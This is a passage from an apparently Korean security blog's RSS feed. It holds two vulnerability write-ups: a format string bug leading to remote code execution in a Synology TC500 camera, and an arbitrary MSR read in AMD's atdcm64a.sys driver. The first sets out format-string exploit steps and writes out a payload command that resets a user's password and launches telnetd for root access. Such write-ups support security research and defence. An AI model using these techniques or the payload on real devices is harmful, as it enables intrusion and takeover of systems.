&#xC218; &#xC788;&#xACE0; &#xC774;&#xB54C; &#xC704;&#xC758;  <code>parse_http_request</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; HTTP &#xC694;&#xCCAD;&#xC744; &#xD30C;&#xC2F1;&#xD569;&#xB2C8;&#xB2E4;. <code>[1]</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>mg_snprintf</code>&#xB85C; &#xC778;&#xD574; &#xD638;&#xC2A4;&#xD2B8; &#xC774;&#xB984;(<code>hostname</code>)&#xACFC; &#xC694;&#xCCAD; URI(<code>conn&#x2192;request_uri</code>)&#xAC00; &#xC5F0;&#xACB0;&#xB418;&#xC5B4; <code>buf</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0; <code>[2]</code>&#xC5D0;&#xC11C; <code>print_debug_msg</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xD6C4; <code>print_debug_msg</code>&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB450; &#xBC88;&#xC9F8; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC778; <code>fmt</code>&#xB97C; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; <code>mg_snprintf</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;(<code>[3]</code>).</p><p><code>mg_snprintf</code>&#xC5D0;&#xC11C;&#xB294; &#xB2E4;&#xC2DC; <code>mg_vsnprintf</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0;(<code>[4]</code>) &#xC5EC;&#xAE30;&#xC11C; parse_http_request&#xC5D0;&#xC11C; &#xD638;&#xC2A4;&#xD2B8;&#xBA85;&#xACFC; &#xC694;&#xCCAD; URI&#xB97C; &#xACB0;&#xD569;&#xD55C; &#xBB38;&#xC790;&#xC5F4;&#xC774; <code>vsnprintf</code>&#xC758; &#xD3EC;&#xB9F7; &#xC2A4;&#xD2B8;&#xB9C1;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xBA74;&#xC11C;(<code>[5]</code>) format string bug&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_debug_msg</span><span class="hljs-params">(<span class="hljs-keyword">pthread_t</span> thread_id, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *fmt)</span> </span>{  <span class="hljs-keyword">int</span> i;  <span class="hljs-keyword">if</span> ( workerthreadcount &gt; <span class="hljs-number">0</span> ) {    i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">do</span> {      <span class="hljs-keyword">if</span> ( debug_table[i].tid == thread_id ) {        mg_snprintf(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, debug_table[i].buf, <span class="hljs-number">0x80</span>u, fmt);  <span class="hljs-comment">//[3]</span>        debug_table[i].buf[<span class="hljs-built_in">strlen</span>(fmt)] = <span class="hljs-number">0</span>;      }      ++i;    } <span class="hljs-keyword">while</span> ( i &lt; workerthreadcount );  }}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mg_snprintf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct mg_connection *conn, <span class="hljs-keyword">int</span> *truncated, <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> buflen, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *fmt, ...)</span> </span>{  va_list ap;  va_start(ap, fmt);  mg_vsnprintf(conn, truncated, buf, buflen, fmt, ap);<span class="hljs-comment">//[4]</span>}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mg_vsnprintf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct mg_connection *conn, <span class="hljs-keyword">int</span> *truncated, <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">size_t</span> buflen, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *fmt, va_list ap)</span> </span>{  <span class="hljs-keyword">int</span> n;  <span class="hljs-keyword">int</span> ok;  <span class="hljs-keyword">if</span> ( buflen ) {    n = vsnprintf(buf, buflen, fmt, ap);<span class="hljs-comment">//[5]</span>    ok = (n &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span> ( n &gt;= buflen ) {      ok = <span class="hljs-number">0</span>;    }    <span class="hljs-keyword">if</span> ( ok ) {      <span class="hljs-keyword">if</span> ( truncated ) {        *truncated = <span class="hljs-number">0</span>;      }      buf[n] = <span class="hljs-number">0</span>;    } <span class="hljs-keyword">else</span> {      <span class="hljs-keyword">if</span> ( truncated ) {        *truncated = <span class="hljs-number">1</span>;      }      mg_cry(conn, <span class="hljs-string">&quot;mg_vsnprintf&quot;</span>, <span class="hljs-string">&quot;truncating vsnprintf buffer: [%.*s]&quot;</span>, (<span class="hljs-keyword">int</span>)((buflen &gt; <span class="hljs-number">200</span>) ? <span class="hljs-number">200</span> : (buflen - <span class="hljs-number">1</span>)), buf);      buf[n] = <span class="hljs-string">&apos;\0&apos;</span>;    }  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( truncated ) {    *truncated = <span class="hljs-number">1</span>;  }}</code></pre><p>HTTP &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xB294; PIE&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xACE0; ASLR&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xC0C1;&#xD0DC;&#xC774;&#xBA70; <code>vsnprintf</code>&#xC758; &#xCD9C;&#xB825;&#xC744; &#xC9C1;&#xC811; &#xBCFC; &#xC218; &#xC5C6;&#xB294; &#xC0C1;&#xD669;&#xC5D0; &#xB354;&#xD574; &#xD3EC;&#xB9F7; &#xC2A4;&#xD2B8;&#xB9C1;&#xC758; &#xCD5C;&#xB300; &#xAE38;&#xC774;&#xAC00; 0x80&#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xC81C;&#xD55C;&#xB418;&#xACE0; &#xD2B9;&#xC815; &#xBC94;&#xC704;(0x00 ~ 0x1F)&#xC758; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xC5D0; &#xD3EC;&#xD568;&#xC2DC;&#xD0A4;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xB4F1; &#xB9CE;&#xC740; &#xC81C;&#xC57D; &#xC0AC;&#xD56D;&#xC774; &#xC874;&#xC7AC;&#xD568;&#xC5D0;&#xB3C4; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; RCE &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xC2A4;&#xD0DD;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2A4;&#xC2A4;&#xB85C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;(looping pointer, &#xC624;&#xD504;&#xC14B; 916)&#xB97C; <code>%916$hhn</code> <em>**</em>&#xACFC; &#xAC19;&#xC740; &#xD3EC;&#xB9F7;&#xC2A4;&#xD2B8;&#xB9C1;&#xC744; &#xD1B5;&#xD574; partial overwrite&#xD574;&#xC11C; &#xB610;&#xB2E4;&#xB978; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;(&#xC624;&#xD504;&#xC14B; 924)&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xBCC0;&#xC870;&#xB41C; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xB2E4;&#xC2DC; &#xD55C;&#xBC88; partial overwrite&#xB97C; &#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; ASLR&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xB113;&#xC740; &#xC601;&#xC5ED;&#xC758; &#xC2A4;&#xD0DD; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; FSB&#xB97C; &#xD1B5;&#xD55C; &#xB370;&#xC774;&#xD130; &#xC77D;&#xAE30; &#xC4F0;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/11/06/pwndorei/2024-11-06/image.png" alt="image.png"></p><p>&#xC774;&#xD6C4; <code>%*111$c</code>&#xC640; &#xAC19;&#xC740; &#xD3EC;&#xB9F7; &#xC2A4;&#xD2B8;&#xB9C1;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xC624;&#xD504;&#xC14B; 111&#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xC758; &#xAC12;&#xB9CC;&#xD07C;&#xC758; &#xBB38;&#xC790;&#xB97C; &#xCD9C;&#xB825;&#xC2DC;&#xD0A4;&#xACE0; &#xC774;&#xB97C; &#xC624;&#xD504;&#xC14B; 924&#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xC2A4;&#xD0DD; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD;&#xC5D0; &#xB9AC;&#xD134; &#xC8FC;&#xC18C; &#xAC12;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xC2A4;&#xD0DD;&#xC758; &#xD2B9;&#xC815; &#xC704;&#xCE58;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xB2E4;&#xC2DC; FSB&#xB97C; &#xD1B5;&#xD574; partial overwrite&#xD574;&#xC11C; PIE&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xBC18;&#xBCF5;&#xD558;&#xC5EC; ROP chain&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>ROP chain&#xC740; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; <code>system</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC11C; <code>sh${IFS}-c${IFS}&apos;echo${IFS}synodebug:synodebug|chpasswd;telnetd</code>&#xB77C;&#xB294; &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xADF8; &#xACB0;&#xACFC; synodebug &#xC720;&#xC800;&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; synodebug&#xB85C; &#xC124;&#xC815;&#xD55C; &#xB2E4;&#xC74C; telnet &#xB370;&#xBAAC;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC2E4;&#xD589;&#xB41C; telnet&#xC5D0; &#xC811;&#xC18D;&#xD574;&#xC11C; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC758; &#xC258;&#xC744; &#xD68D;&#xB4DD;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/Synology/">Synology</category>
      
      <category domain="https://hackyboiz.github.io/tags/FSB/">FSB</category>
      
      <category domain="https://hackyboiz.github.io/tags/TC500/">TC500</category>
      
      
      <comments>https://hackyboiz.github.io/2024/11/06/pwndorei/2024-11-06/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] AMD atdcm64a.sys의 arbitrary pointer dereference으로 인한 LPE 취약점</title>
      <link>https://hackyboiz.github.io/2024/11/03/j0ker/2024-11-03/</link>
      <guid>https://hackyboiz.github.io/2024/11/03/j0ker/2024-11-03/</guid>
      <pubDate>Sun, 03 Nov 2024 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://security.humanativaspa.it/exploiting-amd-at</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://security.humanativaspa.it/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-1/">Exploiting AMD atdcm64a.sys arbitrary pointer dereference &#x2013; Part 1</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Radeon Software Revision Number Adrenalin Edition 18.12.1.1 Optional</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCD1D; 2&#xAC1C;&#xC774;&#xACE0; AMD Adrenalin Edition&#xC758; atdcm64a.sys &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="First-Vulnerability"><a href="#First-Vulnerability" class="headerlink" title="First Vulnerability"></a>First Vulnerability</h3><p>Irp&#xB97C; &#xD1B5;&#xD574; &#xD2B9;&#xC815; IOCTL &#xCF54;&#xB4DC;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xBA74; &#xC720;&#xC800;&#xB85C;&#xBD80;&#xD130; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c">systemBuffer_9 = Irp-&gt;AssociatedIrp.SystemBuffer;v80 = __readmsr(*(_DWORD *)systemBuffer_9); <span class="hljs-comment">// arbitrary read msr</span>*(QWORD *)((<span class="hljs-keyword">char</span> *)systemBuffer_9 + <span class="hljs-number">12</span>) = v80;*(QWORD *)((<span class="hljs-keyword">char</span> *)systemBuffer_9 + <span class="hljs-number">4</span>) = v80;</code></pre><p>&#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC804;&#xB2EC;&#xD55C; systembuffer&#xB97C; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xD574; &#xC784;&#xC758;&#xC758; MSR &#xC77D;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>MSR(Model-Specific Register)&#xC740; CPU &#xB0B4;&#xBD80;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD2B9;&#xC218;&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C;, &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC758; &#xD2B9;&#xC815;&#xD55C; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xB3D9;&#xC791;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xAC70;&#xB098; &#xC0C1;&#xD0DC; &#xC815;&#xBCF4;&#xB97C; &#xC77D;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. MSR&#xC740; CPU &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB974;&#xBA70;, &#xD2B9;&#xC815; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC138;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; &#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; &#xAC19;&#xC740; &#xB0AE;&#xC740; &#xB808;&#xBCA8;&#xC758; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; MSR&#xC744; &#xD1B5;&#xD574; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC758; &#xACE0;&#xAE09; &#xAE30;&#xB2A5;&#xC744; &#xB2E4;&#xB8E8;&#xAC70;&#xB098; &#xC0C1;&#xD0DC;&#xB97C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>MSR&#xC740; CPU &#xB0B4;&#xBD80;&#xC758; &#xB2E4;&#xC591;&#xD55C; &#xC124;&#xC815;&#xACFC; &#xC0C1;&#xD0DC;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC774;&#xBBC0;&#xB85C;, &#xD2B9;&#xC815; MSR&#xC744; &#xC77D;&#xAC70;&#xB098; &#xC870;&#xC791;&#xD560; &#xACBD;&#xC6B0; &#xC2DC;&#xC2A4;&#xD15C; &#xBCF4;&#xC548; &#xBC0F; &#xC548;&#xC815;&#xC131;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; MSR&#xC5D0;&#xC11C; &#xC77D;&#xC744; &#xACBD;&#xC6B0; &#xC704;&#xD5D8;&#xD560; &#xC218; &#xC788;&#xB294; &#xC8FC;&#xC694; &#xC815;&#xBCF4;&#xB4E4;&#xC785;&#xB2C8;&#xB2E4;.</p><ol><li><strong>Time Stamp Counter (TSC) MSR</strong><ul><li><strong>MSR &#xC8FC;&#xC18C;</strong>: 0x10</li><li><strong>&#xC124;&#xBA85;</strong>: &#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB294; CPU &#xD074;&#xB85D; &#xCE74;&#xC6B4;&#xD2B8;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xBA70;, &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xB192;&#xC740; &#xC815;&#xBC00;&#xB3C4;&#xC758; &#xD0C0;&#xC774;&#xBC0D; &#xC815;&#xBCF4;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC704;&#xD5D8;&#xC131;</strong>: &#xACF5;&#xACA9;&#xC790;&#xAC00; TSC &#xC815;&#xBCF4;&#xB97C; &#xD65C;&#xC6A9;&#xD574; <strong>&#xC0AC;&#xC774;&#xB4DC; &#xCC44;&#xB110; &#xACF5;&#xACA9;</strong>&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xD2B9;&#xC815; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xC815;&#xBC00;&#xD558;&#xAC8C; &#xCE21;&#xC815;&#xD558;&#xC5EC; CPU &#xCE90;&#xC2DC; &#xC0C1;&#xD0DC;&#xB97C; &#xCD94;&#xCE21;&#xD558;&#xAC70;&#xB098; &#xC554;&#xD638;&#xD654; &#xC791;&#xC5C5;&#xC758; &#xD0C0;&#xC774;&#xBC0D; &#xC815;&#xBCF4;&#xB97C; &#xC5BB;&#xC5B4;&#xB0B4;&#xB294; &#xB4F1; &#xAC04;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xBBFC;&#xAC10;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xCD94;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>IA32_SYSENTER_EIP, IA32_SYSENTER_CS, IA32_SYSENTER_ESP</strong><ul><li><strong>MSR &#xC8FC;&#xC18C;</strong>: 0x176, 0x174, 0x175</li><li><strong>&#xC124;&#xBA85;</strong>: &#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB4E4;&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xD638;&#xCD9C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xC5D4;&#xD2B8;&#xB9AC; &#xD3EC;&#xC778;&#xD2B8; &#xC8FC;&#xC18C;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC704;&#xD5D8;&#xC131;</strong>: &#xCEE4;&#xB110;&#xC758; &#xC5D4;&#xD2B8;&#xB9AC; &#xD3EC;&#xC778;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB294; &#xCEE4;&#xB110;&#xC758; &#xC81C;&#xC5B4; &#xD750;&#xB984;&#xC744; &#xC774;&#xD574;&#xD558;&#xB294; &#xB370; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xBBC0;&#xB85C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; <strong>ROP(Return-Oriented Programming)</strong> &#xB4F1;&#xC758; &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD560; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xC5D4;&#xD2B8;&#xB9AC; &#xD3EC;&#xC778;&#xD2B8; &#xC8FC;&#xC18C;&#xAC00; &#xC720;&#xCD9C;&#xB418;&#xBA74;, <strong>&#xC8FC;&#xC18C; &#xACF5;&#xAC04; &#xBC30;&#xCE58; &#xB09C;&#xC218;&#xD654;(ASLR)</strong>&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xB370; &#xC545;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>IA32_DEBUGCTL MSR</strong><ul><li><strong>MSR &#xC8FC;&#xC18C;</strong>: 0x1D9</li><li><strong>&#xC124;&#xBA85;</strong>: &#xB514;&#xBC84;&#xADF8;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC124;&#xC815;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C;, &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC758; &#xB514;&#xBC84;&#xAE45; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xC5B4;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC704;&#xD5D8;&#xC131;</strong>: &#xB514;&#xBC84;&#xAE45; &#xC815;&#xBCF4;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC138;&#xBD80;&#xC801;&#xC778; &#xB3D9;&#xC791;&#xC744; &#xC54C; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xBBC0;&#xB85C;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774;&#xB97C; &#xD1B5;&#xD574; <strong>&#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC; &#xD328;&#xD134;</strong>&#xC774;&#xB098; <strong>&#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC2A4;&#xC704;&#xCE6D;</strong>&#xC744; &#xCD94;&#xC801;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xBBFC;&#xAC10;&#xD55C; &#xC791;&#xC5C5;&#xC744; &#xD558;&#xB294; &#xACBD;&#xC6B0; &#xADF8; &#xACFC;&#xC815;&#xC744; &#xAC04;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>IA32_MTRR (Memory Type Range Registers)</strong><ul><li><strong>MSR &#xC8FC;&#xC18C;</strong>: 0x200~0x20F (&#xBC94;&#xC704;)</li><li><strong>&#xC124;&#xBA85;</strong>: &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC758; &#xCE90;&#xC2DC; &#xD2B9;&#xC131;&#xC744; &#xC815;&#xC758;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC785;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC704;&#xD5D8;&#xC131;</strong>: &#xACF5;&#xACA9;&#xC790;&#xAC00; MTRR &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC; &#xB9E4;&#xD551;&#xC744; &#xD30C;&#xC545;&#xD558;&#xACE0; &#xD2B9;&#xC815; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC758; &#xCE90;&#xC2DC; &#xD2B9;&#xC131;&#xC744; &#xC870;&#xC791;&#xD558;&#xBA74;, &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC; &#xC18D;&#xB3C4;&#xB97C; &#xC81C;&#xC5B4;&#xD558;&#xC5EC; <strong>&#xD0C0;&#xC774;&#xBC0D; &#xACF5;&#xACA9;</strong>&#xC774;&#xB098; <strong>&#xCE90;&#xC2DC; &#xCDA9;&#xB3CC; &#xACF5;&#xACA9;</strong>&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC744; &#xCD5C;&#xC801;&#xD654;&#xD558;&#xC5EC; &#xBCF4;&#xC548; &#xC6B0;&#xD68C; &#xAE30;&#xBC95;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>IA32_PERF_STATUS, IA32_PERF_CTL (Performance Monitoring)</strong><ul><li><strong>MSR &#xC8FC;&#xC18C;</strong>: 0x198, 0x199</li><li><strong>&#xC124;&#xBA85;</strong>: CPU&#xC758; &#xC131;&#xB2A5; &#xC0C1;&#xD0DC;&#xC640; &#xC131;&#xB2A5; &#xC81C;&#xC5B4;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC785;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC704;&#xD5D8;&#xC131;</strong>: &#xC131;&#xB2A5; &#xCE74;&#xC6B4;&#xD130; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574; CPU&#xC758; &#xC0C1;&#xD0DC;&#xC640; &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589; &#xBE48;&#xB3C4; &#xB4F1;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; <strong>&#xD0C0;&#xC774;&#xBC0D; &#xACF5;&#xACA9;</strong>&#xC774;&#xB098; <strong>&#xC0AC;&#xC774;&#xB4DC; &#xCC44;&#xB110; &#xACF5;&#xACA9;</strong>&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xD2B9;&#xC815; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xB54C; CPU &#xC0AC;&#xC6A9;&#xB7C9; &#xBCC0;&#xD654;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xC5EC; &#xC554;&#xD638;&#xD654; &#xC791;&#xC5C5;&#xACFC; &#xAC19;&#xC740; &#xBBFC;&#xAC10;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC2DC;&#xC810;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>APIC MSR (Advanced Programmable Interrupt Controller)</strong><ul><li><strong>MSR &#xC8FC;&#xC18C;</strong>: 0x1B, 0xFEE00000~0xFEEFFFFF (APIC MMIO &#xC8FC;&#xC18C; &#xBC94;&#xC704;)</li><li><strong>&#xC124;&#xBA85;</strong>: APIC&#xC740; 